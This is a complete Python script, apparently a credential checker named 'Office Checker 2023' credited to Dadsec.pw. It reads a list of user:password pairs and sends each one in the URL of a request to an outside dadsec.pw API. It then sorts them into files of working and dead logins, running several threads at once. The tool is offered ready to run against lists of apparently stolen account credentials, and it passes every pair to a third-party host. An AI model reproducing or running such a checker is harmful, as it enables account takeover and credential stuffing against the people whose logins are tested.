import sys,os,random
try:
	import requests
except ImportError:
	print ("Trying to Install required module: requests\n")
	os.system('python -m pip install requests')
try:
	from colorama import *
except ImportError:
	print ("Trying to Install required module: colorama\n")
	os.system('python -m pip install colorama')
from multiprocessing.dummy import Pool
from platform import system
init(autoreset=True)
fr  =   Fore.RED
fc  =   Fore.CYAN
fg  =   Fore.GREEN
def cls():
	try:
		linux = 'clear'
		windows = 'cls'
		os.system([linux, windows][os.name == 'nt'])
	except:
		nothing = ""
		
def print_logo():
    clear = "\x1b[0m"
    colors = [36, 34, 35, 31]
    x = """
    ____   __  __ _             _____ _               _             
   / __ \ / _|/ _(_)           / ____| |             | |            
  | |  | | |_| |_ _  ___ ___  | |    | |__   ___  ___| | _____ _ __ 
  | |  | |  _|  _| |/ __/ _ \ | |    | '_ \ / _ \/ __| |/ / _ \ '__|
  | |__| | | | | | | (_|  __/ | |____| | | |  __/ (__|   <  __/ |   
   \____/|_| |_| |_|\___\___|  \_____|_| |_|\___|\___|_|\_\___|_| 2023 

	Coded by Dadsec.pw   telegram: t.me/dadsec_pw
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
cls()
print_logo()

def tool(url):
		sout=url.split(":")
		user=sout[0]
		passwd=sout[1]
		api_url = ("https://dadsec.pw/api/index.php?user=" + user + "&pass=" + passwd)
		api_headers = {"Accept": "*/*", "Expect": "100-continue", "Content-Type": "multipart/form-data; boundary=----------------------------77b37a6de45a"}
		r = requests.get(api_url, headers=api_headers)
		re = r.text
		if re != "1":
			print(fr + "[-] Not Working == {0}:{1}".format(user,passwd))
			dead = (user + ':' + passwd)
			open('Dead.txt', 'a+').write(dead+'\n')
		elif re == "1":
			print(fg + "[+] Working! == {0}:{1}".format(user,passwd))
			success = (user + ':' + passwd)
			open('Working.txt', 'a+').write(success+'\n')

if __name__ == '__main__':
	listshell = input("[#] : Enter list: ")
	with open(listshell, 'r') as get:
		read = get.read().splitlines()
	p = Pool(5)
	result = p.map(tool, read)
	p.close()